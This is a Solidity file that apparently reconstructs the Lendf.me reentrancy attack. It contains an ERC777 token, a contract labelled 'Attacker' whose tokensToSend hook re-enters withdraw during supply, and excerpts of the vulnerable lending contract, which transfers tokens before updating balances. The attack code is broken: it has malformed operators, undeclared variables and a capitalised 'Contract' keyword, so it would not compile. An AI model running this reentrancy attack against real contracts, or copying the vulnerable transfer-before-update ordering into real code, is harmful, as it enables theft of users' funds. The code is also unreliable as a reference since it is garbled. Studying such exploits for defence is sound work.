pragma solidity ^0.6.4;

import "openzeppelin-solidity/contracts/token/ERC777/ERC777.sol";

contract ERC777Token is ERC777 {

    uint256 public constant initialSupply = 2 ** 256 - 1;

    constructor () public ERC777("ERC777Token", "SSST", new address[](0)) {
        _mint(msg.sender, msg.sender, initialSupply, "", "");
    }
}

// Attacker contract
contract Attacker is IERC777Sender {

    function a()
    {
        Lendme me = Lendme(0x11111);
        me.supply(this, 100);
    }

    // ERC777 hook
    function tokensToSend(address, address, address, uint256, bytes calldata, bytes calldata) external {
        require(msg.sender =  = address(_token), "Hook can only be called by the token");
            me.withdraw(this, 100);
    }

    // Include fallback so we can receive ETH from exchange
    function () external payable {}
}
// Lendf.me vulnerable contract
Contract Lendme
{
    /**
    * @notice supply `amount` of `asset` (which must be supported) to `msg.sender` in the protocol
    * @dev add amount of supported asset to msg.sender's account
    * @param asset The market asset to supply
    * @param amount The amount to supply
    * @return uint 0=success, otherwise a failure (see ErrorReporter.sol for details)
    */
    function supply(address asset, uint amount) public returns (uint) {

        Market storage market = markets[asset];
        Balance storage balance = supplyBalances[msg.sender][asset];

        SupplyLocalVars memory localResults; // Holds all our uint calculation results
        Error err; // Re-used for every function call that includes an Error in its return value(s).

        (err, localResults.userSupplyUpdated) = add(localResults.userSupplyCurrent, amount);
        if (err != Error.NO_ERROR) {
            return fail(err, FailureInfo.SUPPLY_NEW_TOTAL_BALANCE_CALCULATION_FAILED);
        }

        // We calculate the protocol's totalSupply by subtracting the user's prior checkpointed balance, adding user's updated supply
        (err, localResults.newTotalSupply) = addThenSub(market.totalSupply, localResults.userSupplyUpdated, balance.principal);

        /////////////////////////
        // EFFECTS & INTERACTIONS
        // (No safe failures beyond this point)

        // We ERC-20 transfer the asset into the protocol (note: pre-conditions already checked above)
        transferFrom(msg.sender, asset, amount);

        // Save market updates
        market.blockNumber = getBlockNumber();
        market.totalSupply =  localResults.newTotalSupply;
        market.supplyRateMantissa = localResults.newSupplyRateMantissa;
        market.supplyIndex = localResults.newSupplyIndex;
        market.borrowRateMantissa = localResults.newBorrowRateMantissa;
        market.borrowIndex = localResults.newBorrowIndex;

        // Save user updates
        localResults.startingBalance = balance.principal; // save for use in `SupplyReceived` event
        balance.principal = localResults.userSupplyUpdated;
        balance.interestIndex = localResults.newSupplyIndex;

        emit SupplyReceived(msg.sender, asset, amount, localResults.startingBalance, localResults.userSupplyUpdated);

        return uint(Error.NO_ERROR); // success
    }

    /**
     * @notice withdraw `amount` of `asset` from sender's account to sender's address
     * @dev withdraw `amount` of `asset` from msg.sender's account to msg.sender
     * @param asset The market asset to withdraw
     * @param requestedAmount The amount to withdraw (or -1 for max)
     * @return uint 0=success, otherwise a failure (see ErrorReporter.sol for details)
     */
    function withdraw(address asset, uint requestedAmount) public returns (uint) {
        if (paused) {
            return fail(Error.CONTRACT_PAUSED, FailureInfo.WITHDRAW_CONTRACT_PAUSED);
        }

        Market storage market = markets[asset];
        Balance storage supplyBalance = supplyBalances[msg.sender][asset];

        WithdrawLocalVars memory localResults; // Holds all our calculation results
        Error err; // Re-used for every function call that includes an Error in its return value(s).
        uint rateCalculationResultCode; // Used for 2 interest rate calculation calls

        // We calculate the user's accountLiquidity and accountShortfall.
        (err, localResults.accountLiquidity, localResults.accountShortfall) = calculateAccountLiquidity(msg.sender);
        if (err != Error.NO_ERROR) {
            return fail(err, FailureInfo.WITHDRAW_ACCOUNT_LIQUIDITY_CALCULATION_FAILED);
        }

        // We calculate the newSupplyIndex, user's supplyCurrent and supplyUpdated for the asset
        (err, localResults.newSupplyIndex) = calculateInterestIndex(market.supplyIndex, market.supplyRateMantissa, market.blockNumber, getBlockNumber());
        if (err != Error.NO_ERROR) {
            return fail(err, FailureInfo.WITHDRAW_NEW_SUPPLY_INDEX_CALCULATION_FAILED);
        }

        (err, localResults.userSupplyCurrent) = calculateBalance(supplyBalance.principal, supplyBalance.interestIndex, localResults.newSupplyIndex);
        if (err != Error.NO_ERROR) {
            return fail(err, FailureInfo.WITHDRAW_ACCUMULATED_BALANCE_CALCULATION_FAILED);
        }

        // If the user specifies -1 amount to withdraw ("max"),  withdrawAmount => the lesser of withdrawCapacity and supplyCurrent
        if (requestedAmount == uint(-1)) {
            (err, localResults.withdrawCapacity) = getAssetAmountForValue(asset, localResults.accountLiquidity);
            if (err != Error.NO_ERROR) {
                return fail(err, FailureInfo.WITHDRAW_CAPACITY_CALCULATION_FAILED);
            }
            localResults.withdrawAmount = min(localResults.withdrawCapacity, localResults.userSupplyCurrent);
        } else {
            localResults.withdrawAmount = requestedAmount;
        }

        // From here on we should NOT use requestedAmount.

        // Fail gracefully if protocol has insufficient cash
        // If protocol has insufficient cash, the sub operation will underflow.
        localResults.currentCash = getCash(asset);
        (err, localResults.updatedCash) = sub(localResults.currentCash, localResults.withdrawAmount);
        if (err != Error.NO_ERROR) {
            return fail(Error.TOKEN_INSUFFICIENT_CASH, FailureInfo.WITHDRAW_TRANSFER_OUT_NOT_POSSIBLE);
        }

        // We check that the amount is less than or equal to supplyCurrent
        // If amount is greater than supplyCurrent, this will fail with Error.INTEGER_UNDERFLOW
        (err, localResults.userSupplyUpdated) = sub(localResults.userSupplyCurrent, localResults.withdrawAmount);
        if (err != Error.NO_ERROR) {
            return fail(Error.INSUFFICIENT_BALANCE, FailureInfo.WITHDRAW_NEW_TOTAL_BALANCE_CALCULATION_FAILED);
        }

        // Fail if customer already has a shortfall
        if (!isZeroExp(localResults.accountShortfall)) {
            return fail(Error.INSUFFICIENT_LIQUIDITY, FailureInfo.WITHDRAW_ACCOUNT_SHORTFALL_PRESENT);
        }

        // We want to know the user's withdrawCapacity, denominated in the asset
        // Customer's withdrawCapacity of asset is (accountLiquidity in Eth)/ (price of asset in Eth)
        // Equivalently, we calculate the eth value of the withdrawal amount and compare it directly to the accountLiquidity in Eth
        (err, localResults.ethValueOfWithdrawal) = getPriceForAssetAmount(asset, localResults.withdrawAmount); // amount * oraclePrice = ethValueOfWithdrawal
        if (err != Error.NO_ERROR) {
            return fail(err, FailureInfo.WITHDRAW_AMOUNT_VALUE_CALCULATION_FAILED);
        }

        // We check that the amount is less than withdrawCapacity (here), and less than or equal to supplyCurrent (below)
        if (lessThanExp(localResults.accountLiquidity, localResults.ethValueOfWithdrawal) ) {
            return fail(Error.INSUFFICIENT_LIQUIDITY, FailureInfo.WITHDRAW_AMOUNT_LIQUIDITY_SHORTFALL);
        }

        // We calculate the protocol's totalSupply by subtracting the user's prior checkpointed balance, adding user's updated supply.
        // Note that, even though the customer is withdrawing, if they've accumulated a lot of interest since their last
        // action, the updated balance *could* be higher than the prior checkpointed balance.
        (err, localResults.newTotalSupply) = addThenSub(market.totalSupply, localResults.userSupplyUpdated, supplyBalance.principal);
        if (err != Error.NO_ERROR) {
            return fail(err, FailureInfo.WITHDRAW_NEW_TOTAL_SUPPLY_CALCULATION_FAILED);
        }

        // The utilization rate has changed! We calculate a new supply index and borrow index for the asset, and save it.
        (rateCalculationResultCode, localResults.newSupplyRateMantissa) = market.interestRateModel.getSupplyRate(asset, localResults.updatedCash, market.totalBorrows);
        if (rateCalculationResultCode != 0) {
            return failOpaque(FailureInfo.WITHDRAW_NEW_SUPPLY_RATE_CALCULATION_FAILED, rateCalculationResultCode);
        }

        // We calculate the newBorrowIndex
        (err, localResults.newBorrowIndex) = calculateInterestIndex(market.borrowIndex, market.borrowRateMantissa, market.blockNumber, getBlockNumber());
        if (err != Error.NO_ERROR) {
            return fail(err, FailureInfo.WITHDRAW_NEW_BORROW_INDEX_CALCULATION_FAILED);
        }

        (rateCalculationResultCode, localResults.newBorrowRateMantissa) = market.interestRateModel.getBorrowRate(asset, localResults.updatedCash, market.totalBorrows);
        if (rateCalculationResultCode != 0) {
            return failOpaque(FailureInfo.WITHDRAW_NEW_BORROW_RATE_CALCULATION_FAILED, rateCalculationResultCode);
        }

        /////////////////////////
        // EFFECTS & INTERACTIONS
        // (No safe failures beyond this point)

        // We ERC-20 transfer the asset into the protocol (note: pre-conditions already checked above)
        err = doTransferOut(asset, msg.sender, localResults.withdrawAmount);
        if (err != Error.NO_ERROR) {
            // This is safe since it's our first interaction and it didn't do anything if it failed
            return fail(err, FailureInfo.WITHDRAW_TRANSFER_OUT_FAILED);
        }

        // Save market updates
        market.blockNumber = getBlockNumber();
        market.totalSupply =  localResults.newTotalSupply;
        market.supplyRateMantissa = localResults.newSupplyRateMantissa;
        market.supplyIndex = localResults.newSupplyIndex;
        market.borrowRateMantissa = localResults.newBorrowRateMantissa;
        market.borrowIndex = localResults.newBorrowIndex;

        // Save user updates
        localResults.startingBalance = supplyBalance.principal; // save for use in `SupplyWithdrawn` event
        supplyBalance.principal = localResults.userSupplyUpdated;
        supplyBalance.interestIndex = localResults.newSupplyIndex;

        emit SupplyWithdrawn(msg.sender, asset, localResults.withdrawAmount, localResults.startingBalance, localResults.userSupplyUpdated);

        return uint(Error.NO_ERROR); // success
    }
}
